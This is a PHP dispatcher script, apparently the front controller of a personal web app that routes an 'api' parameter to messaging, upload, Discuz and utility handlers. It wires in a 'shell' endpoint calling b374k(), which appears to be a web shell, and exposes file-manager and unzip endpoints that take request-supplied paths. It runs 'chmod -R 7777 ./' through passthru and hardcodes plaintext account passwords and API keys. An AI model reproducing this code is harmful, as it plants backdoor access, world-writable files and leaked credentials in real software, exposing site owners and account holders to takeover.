<?php

	ob_start();
	session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
	if(isset($_COOKIE[session_name()])) { 
  	session_id($_COOKIE[session_name()]); 
	} 
	setcookie(session_name(),session_id(),time()+3600 * 24 * 30 * 12 * 20);
	session_start();
	if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
	}
	elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
	}
$runtime= new runtime;
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['start'] = $runtime->get_microtime();

// #!/usr/bin/php -q

/*
---------------------------------------------------------------------------------------------------------------

http://gz.feixin.10086.cn
http://sendcloud.sohu.com/
https://datamarket.azure.com/
http://code.google.com/p/xmpphp 0.1rc2-r77
https://openshift.redhat.com/app/console/ions
https://access.redhat.com/knowledge/docs/OpenShift/
https://www.dnspod.cn/
http://msdn.microsoft.com/en-us/live//default.aspx
http://www.addthis.com/
http://webthumbnail.org/api-reference
https://www.parse.com/
https://www.fpdf.org/
http://webthumbnail.org/api-reference
http://fanyi.youdao.com/openapi?path=web-mode&mode=fanyier
http://www.tudou.com/
http://evolution.voxeo.com/

---------------------------------------------------------------------------------------------------------------
*/ 

// 集中设置区域
$ipstr='';
$IPFilter = new IPFilter($ipstr);
$redirecturl = syssetini().'&serverip='.trim($_SERVER['SERVER_NAME'])."&verify=";
//echo trim(request('api')).trim(request('action')).$redirecturl;
//exit;
$botapienable = '1';
$smartverify = '1';
$ipverify = '11';
//echo 'gggg';
//exit;

// 集中设置区域

// --------------------------------

if(!isset($_SERVER['REMOTE_ADDR'])){
        // #!/usr/bin/php -q
        cpanel();
        return true;
}
elseif(strtolower(trim(request('api'))) == 'fetion'){

}
elseif(strtolower(trim(request('api'))) == 'htaccess'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != ''){
                        redirect($redirecturl);
                        return;
                }       
        }	
}
elseif(strtolower(trim(request('api'))) == 'setup'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != ''){
                        redirect($redirecturl);
                        return;
                }       
        }
}
elseif(strtolower(trim(request('api'))) == 'voxeo'){
        if($botapienable == '1'){
                if(trim(request('botapikey')) != 'vnjk4673fvhn578g'){
                        redirect($redirecturl); 
                        return;         
                }       
        }       
}

elseif(strtolower(trim(request('api'))) == 'lcid'){
}
elseif(strtolower(trim(request('api'))) == 'vpn' && strtolower(trim(request('action'))) == 'code' ){
}
elseif(strtolower(trim(request('api'))) == 'blank'){
}
elseif(strtolower(trim(request('api'))) == 'baidu'){
}
elseif(strtolower(trim(request('api'))) == 'cdndown'){
}
elseif(strtolower(trim(request('api'))) == 'verify'){
	verify();
	exit;
}
else{
		
	//echo $redirecturl;
	//exit;

	$IPFilter = new IPFilter('');
  $ipallow = $IPFilter->IPlimiter();

        //print_r($IPFilter->IPlimiter());

	if (arrmember(checkip($ipallow,$redirecturl),'0') == '0' && $ipverify === '1'){
		redirect(arrmember(checkip($ipallow,$redirecturl),'1')); 
		//echo '1';
	}
	else{
		
if(''==''){
	
	session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
	if(isset($_COOKIE[session_name()])) { 
  	session_id($_COOKIE[session_name()]); 
	} 
	setcookie(session_name(),session_id(),time()+3600 * 24 * 30 * 12 * 20);
	session_start();
	if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
	}
	elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
		session_register("X3193");
	}
$runtime= new runtime;
$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['runime']['start'] = $runtime->get_microtime();
	
	//echo $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'].' j '.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];
	
if(($_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] == $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])&&($_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']!='')){

			if(file_exists('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){

			}else{
	       	touch ('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success']);        			
			}
			
}
else{
	if(file_exists('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){

			$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'] = $_COOKIE["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'];	
	    session_write_close();			
			session_set_cookie_params(3600 * 24 * 30 * 12 * 20);
			if(isset($_COOKIE[session_name()])) { 
  			session_id($_COOKIE[session_name()]); 
			} 
			setcookie(session_name(),session_id(),time()+3600 * 24 * 30 * 12 * 20);
			session_start();
			if(substr(PHP_VERSION, 0, 3)=='5.4'){
				//session_register("X3193");
			}
			elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
				session_register("X3193");
			}	
					
	}
	elseif(file_exists('./verifylist/'.trim($_SERVER["SERVER_NAME"]).'_'.$_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'])){

			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][success]", $_SESSION["X3193"]['global'][trim($_SERVER["SERVER_NAME"])]['verify']['success'], time() + 3600*24*31);

	}
	else{
		
			setcookie ("X3193[global][".trim($_SERVER["SERVER_NAME"])."][verify][url]", trim($_SERVER["SCRIPT_NAME"])."?".$_SERVER['QUERY_STRING'], time() + 3600*24*31*12*20);
			session_destroy();
			if(!is_dir('./verifylist/')){
						mkdir('./verifylist/',0777);
			}			
			if(function_exists('passthru')){
						passthru("find ./verifylist/* -type f -mtime +90 -delete",$result);			
						passthru("chmod -R 7777 ./",$result);
			}else{
						deldir('./verifylist/','90','');
			}		
			echo "<script>window.location = \"".httppath()."?api=verify&verify="."\" ;</script>";
			exit;	
			
	}
}
}
	}	

}

switch (strtolower(trim(request('api')))) {
    case "htaccess":
        htaccess();
	break;
    case "icon":
        icon();
	break;
    case "vpn":
        vpn();
	break;
    case "mobile":
        mobile();
	break;
    case "msn":
        msn();
	break;
    case "openshift":
        openshift();
	break;
    case "shell":
        b374k();
	break;	
    case "meitu":
        meitu();
	break;	
    case "picture":
        picture();
	break;
    case "vdisk":
        vdisk();
	break;	
    case "imified":
        imified();
	break;
    case "xhtmlpro":
        xhtmlpro();
	break;	
    case "media":
        wiqet();
	break;
    case "cpanel":
        cpanel();
	break;
    case "filenamager":
        filenamager();
	break;
    case "voxeo":
        voxeo();
	break;
    case "tropo":
        tropo();
	break;
    case "discuz":
//header('Content-Type: text/html; charset=utf-8');
header('Content-Type: text/html; charset=gb2312');

define('CURSCRIPT', 'diy');//body的一个class标识
require './source/class/class_core.php';//引入系统核心文件
$discuz = & discuz_core::instance();//以下代码为创建及初始化对象
$discuz->cachelist = $cachelist;
$discuz->init();
loadcache('diytemplatename');//DIY要载入缓存 
//echo getcharset();    
//exit;
			
switch (trim(request('action'))) {
        case "ths":
$navtitle = iconv('gb2312','utf-8','FLASH股市行情');
$metakeywords = iconv('gb2312','utf-8','FLASH,股市行情');
$metadescription = iconv('gb2312','utf-8','FLASH股市行情');
               	break;
        case "zhibo":
$navtitle = iconv('gb2312','utf-8','国际网络直播');
$metakeywords = iconv('gb2312','utf-8','国际,直播');
$metadescription = iconv('gb2312','utf-8','国际网络直播');
               	break;
        case "meitu":

$navtitle = iconv('gb2312','utf-8','美图图片美化');
$metakeywords = iconv('gb2312','utf-8','美图,图片美化');
$metadescription = iconv('gb2312','utf-8','美图图片美化');
               	break;       
        case "bing":

$navtitle = iconv('gb2312','gb2312','Bing搜索引擎');
$metakeywords = iconv('gb2312','gb2312','Bing,搜索引擎');
$metadescription = iconv('gb2312','utf-8','Bing搜索引擎');
               	break;                	        	
        default:
        
               	break;
}               	
include template('diy:forum/diy_header');//调用单页模版文件
        discuz();
        //echo '我'.iconv('gb2312','utf-8','FLASH股市行情');
include template('diy:forum/diy_footer');//调用单页模版文件    

	break;	
    case "stock":
        stock_10jqka();
	break;
    case "jiankongbao":
        jiankongbao();
	break;
    case "fpdf":
        fpdf();
	break;
    case "pdf":
        fpdf();
	break;
    case "byban":
        byban();
	break;
    case "webxml":
        webxml();
	break;
    case "bing":
        bing();
	break;
    case "tel":
        tel();
	break;
    case "idoll":
        idoll();
	break;
    case "smtp":
        smtp();
	break;
    case "blank":
        blank();
	break;
    case "phpinfo":
        phpsysinfo();
	break;
    case "gmap":
        gmap();
	break;
    case "unzip":
        $archive_type = "zip";
        if ($archive_type == "zip") {
                $zip = new PclZip("./".trim(request("zip")));
                chmod("./unzip", 777);          
                $list = $zip->extract($p_path = "./unzip");
        }
        elseif ($archive_type == "tar" || $archive_type == "tgz" || $archive_type == "gz") { 
                chmod("./unzip", 777);
                $list = PclTarExtract("./".trim(request("zip")), "./unzip/");
        }
        print_r($list);
	break;
    case "zip":
        $zip = new zipfile();
        $handle = fopen("./unzip/".trim(request("file")), "x+");
        $string = fread($handle, filesize("./unzip/".trim(request("file"))));
        fclose($handle);        
        $zip->addFile($string, "unzip/".trim(request("file")));
        $string = $zip->file();
        chmod("./unzip", 777);  
        $handle = fopen("./unzip/".trim(request("file")).".".time().".zip", "wb");
        fwrite($handle, $string);
        fclose($handle);        
	break;
    case "player":
        player();
	break;
    case "ispeech":
        ispeech();
	break;
    case "gtalk":
        gtalk();
	break;
    case "xmpp":
        xmpphp();
	break;
    case "dnspod":
        dnspod();
	break;
    case "zoho":
        zoho();
	break;
    case "pathparse":
        print_r(parse_url("sfhsfjkl.jpg"));
	break;
    case "imageconvert":
        new ImageConverter('x3193.gif','png',1);
	break;
    case "test":
		$str=split('[|]',file_get_contents('./cc.txt', true));
		//print_r($str);
		for ($i = 0; $i < count($str); $i++) {
			$str[$i]=split('[ ]',$str[$i]);
		}
		$str2=split('[|]',file_get_contents('./c.txt', true));

		//print_r($str2);		
		//exit;
		      $url = 'https://api.datamarket.azure.com/Bing/MicrosoftTranslator/v1/GetLanguagesForTranslation';
          $postdata = '';
          $header[] = "Content-Type: text/xml; charset=utf-8";
          $header[] = "Content-length: ".strlen($postdata);
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, $url);
          curl_setopt($ch, CURLOPT_HEADER, 0);
          curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
          curl_setopt($ch, CURLOPT_USERPWD, 'm6JvX/s5J8RF97Ip7um8pPRR0Kesh+G7HYSH/QiN3X0=:m6JvX/s5J8RF97Ip7um8pPRR0Kesh+G7HYSH/QiN3X0=');
          curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);          
          curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
          $jsonarray = curl_exec($ch);
          //print_r($jsonarray); 
          curl_close($ch);
          
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        // 加Xml 文件    
                        $objXml->loadXML($jsonarray);
                        $objList = $objXml->getElementsByTagName("entry");
                        for($j=0; $j < $objList->length;$j++){
                        	$objHdd = $objList->item($j);                         	
                        	for($i=0; $i <max(count($str),count($str2)/2) ;$i++){
                                	if(strtolower($str2[$i*2])==strtolower($objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue)){
                                		echo ($str2[$i*2]).','.$str2[$i*2+1].'|';
                                		break;
                                	}                        		
                                	elseif(strtolower($str[$i][count($str[$i])-3])==strtolower($objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue)){
                                		if(count($str[$i])==5){
                                			echo strtolower($str[$i][count($str[$i])-3]).','.$str[$i][count($str[$i])-5].','.$str[$i][count($str[$i])-4].'|';
                                		}else{
                                			$s='';
                                			for($k=0; $k <= count($str[$i])-5;$k++){
                                				$s=$s.' '.$str[$i][$k];
                                			}
                                			echo $objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue.','.trim($s).','.$str[$i][count($str[$i])-4].'|';
                                		}
                                		break;
                                	}
                                	//echo '('.strtolower($objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue.')';
                          }
                          if(strtolower($str[$i][count($str[$i])-3])==strtolower($objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue)){
                          }
                          elseif(strtolower($str2[$i*2])==strtolower($objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue)){
                          }
                          else{
                          	echo '['.$objHdd->getElementsByTagName(arrmember(split("[:]","d:Code"),"1"))->item(0)->nodeValue.']';   
                          }
             
                       		 
                        }                      
		
    exit;    
    echo getheadcharset();
    exit;
system("cp -f /etc/php.d/sqlite3.ini /var/lib/openshift/93f3858302ee4d3da0a8fd15d6f6af22/app-root/runtime/repo/php/",$uyyyy);
echo $uyyyy;
    					if (function_exists('dl'))
    						echo 'tgggg';
    					echo '11111';
    					exit;
    					$mediafire = new mediafire_class();
    					$mediafire->mediafirefileconvert();
    					exit;
                 													$vdisk = new vdisk_class();
																					if($vdisk->vdiskxupload("xcy6272003@126.com", "EUIfgwe7","./tmp/vdisk/bmfmt4setup.exe","0")){ 
																								echo 'okccc'.time();
																					}
    
    	exit;
                   			//$_SESSION['X3193']['global']['']['verify']['success'] = randcode(32,'');
              		 			setcookie("X3193[global][tt][verify][success]", $_SESSION["X3193"]['global']['']['verify']['success']);
              		 			echo trim($_SERVER['REMOTE_ADDR']);

			exit;	

    		if(!file_exists('./ddddd')){
					echo file_exists('./ddddd');
					mkdir("./ddddd", 0777, true);
					echo file_exists('./ddddd');
				}	

    		exit;
    		
				if(trim(request('post'))==''){
				?>
<html>
<body>
<Form action="?api=test&post=1" enctype="multipart/form-data" method="post" id='tudou'>
    <input type="file" name="file" id="upFile">
    <input type="submit" value="Submit" />
</Form>

				<?php 
				exit;
				}
                        	$url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','你好'))."&tags=".encodeuri(iconv('gb2312','utf-8','你好').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','你好')); 
                                echo $url;
                                $postdata = '';
                                $header[] = "Content-type: application/json; charset=utf-8";
                                $header[] = "Content-length: ".strlen($postdata);
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                curl_setopt($ch, CURLOPT_USERPWD, 'xcy6272003@126.com'.':'.'EUIfgwe7');
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                $jsonstr = curl_exec($ch);
                                $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                curl_close($ch);
                                //echo $jsonstr;
                                $jsonarray = json_decode($jsonstr,true);

                       		//$filename = time().'.'.geturlinfo(httppathdir()."/tmp/".basename($_FILES['file']['name']),"ext");

                       		copy($_FILES['file']['tmp_name'], "./tmp/".basename($_FILES['file']['name']));
                       		//echo realpath("tmp/".$filename);
               			$ch = curl_init();
               			curl_setopt($ch, CURLOPT_URL, trim(httppathdir()."/tmp/".basename($_FILES['file']['name'])));
               			curl_setopt($ch, CURLOPT_HEADER, 0);
               			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
               			curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
               			curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
               			$xmlstr = curl_exec($ch);
                       		//echo $xmlstr;               			
               			curl_close($ch);
               			$postdata = array(
					"file"  => "@"."tmp/".basename($_FILES['file']['name'])
				);
               			
                       		$url = $jsonarray['itemUploadInfo']['uploadUrl']; 
                       		echo $url;               
                       		$header[] = "Content-type: application/x-www-form-urlencoded";
                       		$header[] = "Content-length: ".strlen($postdata);
                       		//$header[] = $postdata;
                       		$ch = curl_init();
                       		curl_setopt($ch, CURLOPT_URL, $url);
                       		curl_setopt($ch, CURLOPT_HEADER, 0);
                       		//curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                       		//curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                       		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                       		curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                       		curl_setopt($ch, CURLOPT_POST, 1);
                       		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                       		$xmlstr = curl_exec($ch);
                       		echo $xmlstr;
                       		curl_close($ch);

			        //echo $xmlstr;
        			$pathinfo = parse_url(trim(httppathdir()."/tmp/".basename($_FILES['file']['name'])));
        			if($pathinfo['host'] == $_SERVER['SERVER_NAME'])
                			unlink('./tmp/'.geturlinfo(trim(httppathdir()."/tmp/".basename($_FILES['file']['name'])),"filename"));
			
        			$objXml = new DOMDocument();  
        			$objXml->preserveWhiteSpace = true;
        			$objXml->async = false; 
        			//echo $xmlstr;
   				return;
                                
                                $url = "http://api.tudou.com/v3/gw?method=item.upload";               
                                echo $url;
                                $url = "http://api.tudou.com/v3/gw?method=item.upload&appKey=5522b8d49cf7bfd9&content=".encodeuri(iconv('gb2312','utf-8','你好'))."&tags=".encodeuri(iconv('gb2312','utf-8','你好').','.iconv('gb2312','utf-8','X3193'))."&channelId=10&title=".encodeuri(iconv('gb2312','utf-8','你好'));               
                                $header[] = "Content-type: application/json; charset=utf-8";
                                $header[] = "Content-length: ".strlen($postdata);
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                curl_setopt($ch, CURLOPT_USERPWD, 'xcy6272003@126.com'.':'.'EUIfgwe7');
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                $jsonstr = curl_exec($ch);
                                $jsoncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                curl_close($ch);
                                echo $jsonstr;
                                $jsonarray = json_decode($jsonstr);
                                ?>
<html>
<body>
<Form action="<?php echo $jsonarray['itemUploadInfo']['uploadUrl'];?>" enctype="multipart/form-data" method="post" id='tudou'>
    <input type="file" name="file" id="upFile">
    <input type="submit" value="Submit" />
</Form>
</body>
</html>
                                
                                <?php 
                                return;

    				echo rand(0,1);
				?>
				<script language="JavaScript" type="text/javascript">
					var count = 0;
					function talk(){
						if (count == '0'){
							count = 1;
	        					document.getElementById('talk').innerHTML = '<embed  style="margin-bottom: -3px;" src="?api=ispeech&action=binary&tts=<?php echo encodeuri(iconv('gb2312','utf-8',trim(request('tts'))))?>" autostart="true" loop="true" hidden="true" width="0" height="0"><a href="javascript:talk();">返回</a></embed>';
						}	
						else{
							count = 0;
	        					document.getElementById('talk').innerHTML = '<a href="javascript:talk();">说话</a>';
						}	
        				}
				</script>
				<span id='talk' width='0' height='0'><a href='javascript:talk();'>说话</a></span>
				
				<object style="margin-bottom: -3px;" type="application/x-shockwave-flash" data="http://www.ispeech.org//dewplayer-mini.swf" width="165" height="20" id="dewplayer" name="dewplayer">
              			<param name="wmode" value="transparent" />
             			<param name="movie" value="http://www.ispeech.org//dewplayer-mini.swf"/>
              			<Param name="flashvars" value="mp3=http://api.ispeech.org/api/rest?apikey=<?php  echo encodeuri("b40d4be174135612e9eff368efe3bf64&format=mp3&action=convert&text=".encodeuri(iconv('gb2312','utf-8',trim(request('tts'))))."&voice=chchinesemale");?>">
              			<param name="wmode" value="transparent" />
              			<param name="AutoStart" value="1" />
              			</object>

				<?php 
    				echo encodeuri(iconv('gb2312','utf-8','你好'));
    				return;
				print_r(json_decode('{"error": {"errors": [{"domain": "global","reason": "required","message": "Required","locationType": "parameter","location": "resource.longUrl"}],"code": 400,"message": "Required"}}', true));
				return;

 			        //setcookie ("X3193[global][verify][success]", "ddddd", time() + 3600*24*31, "/", ".".$_SERVER['SERVER_NAME'], 1);
 				//echo $_COOKIE['X3193']['global'][arrmember(checkip($ipowner,$redirecturl),'1')]['verify']['success'];
 				//return;
 				
 				//print_r(json_decode('{"error": {"errors": [{"domain": "global","reason": "required","message": "Required","locationType": "parameter","location": "resource.longUrl"}],"code": 400,"message": "Required"}}',true));
 				
                                $user = trim(request('user'))?trim(request('user')):'8615998963077';
                                $msg = iconv('gb2312','utf-8',trim(request('msg')))?iconv('gb2312','utf-8',trim(request('msg'))):iconv('gb2312','utf-8',Pinyin(trim('域名删除失败！原因：“未选择任何条目！”bccaqc'),getcharset(),true,"cn"));
                                $url = "http://api.messaging.staging.voxeo.net/1.0/messaging?botkey=94491&apimethod=send&user=".trim($user)."&network=sms&from=12026008419&msg=".encodeuri($msg);               
                                echo $url;
                                $postdata = '';
                                $header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
                                $header[] = "Content-length: ".strlen($postdata);
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
                                curl_setopt($ch, CURLOPT_USERPWD, 'x3193'.':'.'EUIfgwe7');
                                curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                $xmlstr = curl_exec($ch);
                                $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
                                curl_close($ch);
                                echo $xmlstr;
                                return;


session_start();//开启session; 
$authnum_session = ''; 
$str = 'abcdefghijkmnpqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'; 
//定义用来显示在图片上的数字和字母; 
$l = strlen($str); //得到字串的长度; 
//循环随机抽取四位前面定义的字母和数字; 
$numcount = trim(request("count"))==""?"4":trim(request("count"));
for($i=1;$i<=$numcount;$i++) 
{ 
$num=rand(0,$l-1); 
//每次随机抽取一位数字;从第一个字到该字串最大长度, 
//减1是因为截取字符是从0开始起算;这样34字符任意都有可能排在其中; 
$authnum_session.= $str[$num]; 
//将通过数字得来的字符连起来一共是四位; 
} 
        echo $authnum_session;
        return;
        
        session_start();
        $data=array('mail' => array('uname' => 'x3193', 'pwd' => 'EUIfgwe7'),'uname'=>'x3193');
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
        session_register("data");
}        

        $_SESSION["data"]=$data;
        echo $_SESSION["data"]['uname'];
        session_unset("data");
        session_unregister("data");
        return;


        $url = "https://api.smsified.com/v1/messages/";
        //$postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','我');
        //$header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
        //$header[] = "Content-length: ".strlen($postdata);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERPWD, 'x3193'.':'.'EUIfgwe7');
        //curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
        //curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                        
        //curl_setopt($ch, CURLOPT_POST, 1);
        //curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
        $xmlstr = curl_exec($ch);
        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
        curl_close($ch);
        echo $xmlstr.$xmlcode;
        if (trim(request('get')) == "")
                return;
                                
        $url = "https://api.smsified.com/v1/smsmessaging/outbound/tel%3A%2B14123466287/requests";
        $postdata = "address=tel%3A%2B14122138942&message=Hi".iconv('utf-8','gb2312','我');
        $header[] = "Content-type: application/x-www-form-urlencoded; charset=utf-8";
        $header[] = "Content-length: ".strlen($postdata);
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_USERPWD, 'x3193'.':'.'EUIfgwe7');
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);                  
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 150);                                                 
        $xmlstr = curl_exec($ch);
        $xmlcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
        curl_close($ch);
        echo $xmlstr.$xmlcode;

        $str = 'IM-d-T';
        if (strpos($str, 'IM') == '0' && (preg_replace("/IM[-][ ]*([^ ]+)[ ]*[-][ ]*([^ ]+)[ ]*/", "IM-\$1-\$2", $str) == $str)){
                echo 'yyyyy';
        }
        else{
                echo 'exit';
        }

        date_default_timezone_set('UTC'); 
        list($msec, $sec) = explode(" ", microtime()); 
        echo date("YmdHis",$sec+3600*8); 
        echo "gd:when startTime='".date("Y",$sec+3600*8)."-".date("m",$sec+3600*8)."-".date("d",$sec+3600*8)."T".date("h",$sec+3600*8).":".date("i",$sec+3600*8).":".date("s",$sec+3600*8).".000Z' endTime='".date("Y",$sec+3600*8)."-".date("m",$sec+3600*8)."-".date("d",$sec+3600*8)."T".date("h",$sec+3600*(8+1)).":".date("i",$sec+3600*8).":".date("s",$sec+3600*8).".000Z'";
        return;
        $str = '提醒：活动详情 @ 2010-09-21 (周二) 下午7:52 - 下午8:52 (robot@xiayu.x3193.cz.cc)';
        echo substr($str,strpos($str,'：')+2,strripos(substr($str,strpos($str,'：')+1,strpos($str,'@')-1),'@')-2);
        echo "\r\n";

        date_default_timezone_set('UTC'); 
        list($msec, $sec) = explode(" ", microtime()); 
        echo date("YmdHis",$sec+3600*8).rand(1,1000).".ico"; 
        echo "\r\n";

        $mime = 'Subject: =?UTF-8?B?UHLDvGZ1bmcgUHLDvGZ1bmc=?=
To: example@example.com
Date: Thu, 1 Jan 1970 00:00:00 +0000
Message-Id: <example@example.com>
Received: from localhost (localhost [127.0.0.1]) by localhost
    with SMTP id example for <example@example.com>
    Thu, 1 Jan 1970 00:00:00 +0000 (UTC)
    (envelope-from example-return-0000-example=example.com@example.com)
Received: (qmail 0 invoked by uid 65534); 1 Thu 2003 00:00:00 +0000';
                        $headers =  iconv_mime_decode_headers(GetGB2312String($mime), 0, "gbk");
                        print_r($headers);

        echo strripos("x3193.x3193.pp.ru","x3193.pp.ru")." ".(strlen("x3193.x3193.pp.ru")-strlen("x3193.pp.ru"))." ";
        echo "\r\n";

        echo $_SERVER['REMOTE_HOST'];
        echo "\r\n";
        
        $ch = curl_init();
        $url = httppathdir()."?api=lcid";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        $xmlstr = curl_exec($ch);
        echo curl_getinfo($ch,CURLINFO_HTTP_CODE);
        echo "\r\n";
        curl_close($ch);        

        echo $_SERVER["PHP_SELF"];
        echo "\r\n";
        echo substr(sprintf('%o', fileperms('./record')), -4)."\r\n";
        echo "\r\n";
        echo substr(sprintf('%o', fileperms('./index.php')), -4)."\r\n";
        echo "\r\n";
        echo preg_replace("/{[^{}]+}(.*)/", "\$1", "{imap.126.com:143}INBOX");
        echo "\r\n"; 
         
        echo substr(sprintf('%o', fileperms('/')), -4);   
        echo "\r\n";
        echo str_replace("。",".......","我“我！我。我，我！我：我；我？我：");       

	break;
    case "360safe":
        safe360();
	break;
    case "ftp":
        ftp();
	break;
    case "ivr":
        IVR();
	break;
    case "blogger":
        google();
	break;
    case "calendar":
        google();
	break;
    case "urlshortener":
        google();
	break;
    case "google":
        google();
	break;
    case "checkcode":
        checkcode();
	break;
    case "ieshow":
        ieshow();
	break;
    case "live":
        live();
	break;
    case "thumb":
        webthumbnail();
	break;
    case "fetion":
        fetion();
